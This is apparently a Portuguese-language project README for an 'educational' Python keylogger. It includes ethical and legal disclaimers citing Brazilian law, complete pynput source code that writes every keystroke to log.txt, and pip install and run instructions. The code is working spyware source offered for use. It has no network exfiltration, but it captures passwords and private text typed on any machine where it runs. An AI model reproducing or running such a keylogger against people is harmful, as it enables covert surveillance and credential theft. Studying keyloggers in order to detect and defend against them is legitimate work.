# 🧠 Keylogger Educativo em Python

> **Aviso ético:**  
> Este projeto foi criado **exclusivamente para fins educacionais** — com o objetivo de estudar como softwares de captura de teclado funcionam internamente, dentro do contexto de **segurança da informação** e **cibersegurança defensiva**.  
> **O uso indevido deste código é ilegal.** Utilize-o apenas em **ambientes de teste e com autorização explícita**.

---

## 📜 Descrição

Este é um **keylogger simples em Python** desenvolvido para demonstrar como capturar e registrar entradas de teclado utilizando a biblioteca [`pynput`](https://pypi.org/project/pynput/).

O programa monitora as teclas pressionadas e as armazena em um arquivo de texto (`log.txt`), ignorando teclas de controle como `Shift`, `Ctrl`, `Alt` e `CapsLock`.

---

## ⚙️ Funcionalidades

- Captura de teclas alfanuméricas e símbolos.  
- Reconhecimento de teclas especiais como `Espaço`, `Enter`, `Tab` e `Backspace`.  
- Ignora teclas de modificação (Shift, Ctrl, Alt, etc.).  
- Registro contínuo em `log.txt`.  

---

## 🧩 Código-fonte

```python
from pynput import keyboard

IGNORAR = {keyboard.Key.shift, 
           keyboard.Key.shift_r, 
           keyboard.Key.ctrl_l, 
           keyboard.Key.ctrl_r, 
           keyboard.Key.alt_l, 
           keyboard.Key.alt_r, 
           keyboard.Key.caps_lock, 
           keyboard.Key.cmd}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
````

---

## 🚀 Como executar

### 1️⃣ Instale o Python (3.8+)

Certifique-se de ter o Python instalado em seu sistema.

### 2️⃣ Instale a biblioteca necessária

```bash
pip install pynput
```

### 3️⃣ Execute o script

```bash
python keylogger.py
```

O programa começará a registrar as teclas pressionadas e salvará em `log.txt`.

---

## 🔐 Considerações de segurança

* Use apenas em **ambientes de teste locais**.
* **Nunca** utilize para capturar informações de terceiros.
* Remova o arquivo `log.txt` após os testes.
* Utilize este conhecimento para desenvolver **defesas e detecções contra keyloggers maliciosos**.

---

## 🧠 Objetivo educativo

Este projeto faz parte de estudos sobre:

* Engenharia reversa e segurança ofensiva;
* Testes de intrusão (Pentest);
* Desenvolvimento seguro em Python;
* Prevenção e detecção de keyloggers.

---

## 🛡️ Aviso legal

> A captura de dados pessoais sem consentimento é crime, conforme o **Art. 154-A do Código Penal Brasileiro** (Lei nº 12.737/2012 – “Lei Carolina Dieckmann”).
> Use este conhecimento de forma **ética e responsável**.

---

## 🧾 Contato / Notas finais

Rafael Kmohan Paulino Patricio
rkmohanpp@gmail.com

O autor **não se responsabiliza** por qualquer uso indevido deste código.

